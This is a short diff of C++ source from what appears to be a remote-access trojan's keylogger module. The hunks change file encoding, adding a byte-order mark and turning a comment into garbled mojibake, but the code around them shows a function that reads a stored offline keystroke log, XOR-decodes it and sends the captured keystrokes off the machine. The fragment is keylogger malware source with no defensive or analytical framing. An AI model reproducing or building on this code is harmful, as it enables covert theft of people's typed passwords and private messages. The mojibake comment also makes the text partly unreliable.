@@ -1,4 +1,4 @@
-#include "StdAfx.h"
+ï»¿#include "StdAfx.h"
 #include "KeyboardManager.h"
 #pragma comment(lib, "Imm32.lib")
 BOOL OLKeyLog = TRUE;
@@ -63,7 +63,7 @@ int CKeyboardManager::sendOfflineRecord()
 		dwSize = GetFileSize(hFile, NULL);
 		TCHAR *lpBuffer = new TCHAR[dwSize];
 		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
-		// ½âÃÜ
+		// è§£å¯†
 		for (int i = 0; i < (dwSize/sizeof(TCHAR)); i++)
 			lpBuffer[i] ^= XOR_ENCODE_VALUE;
 		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
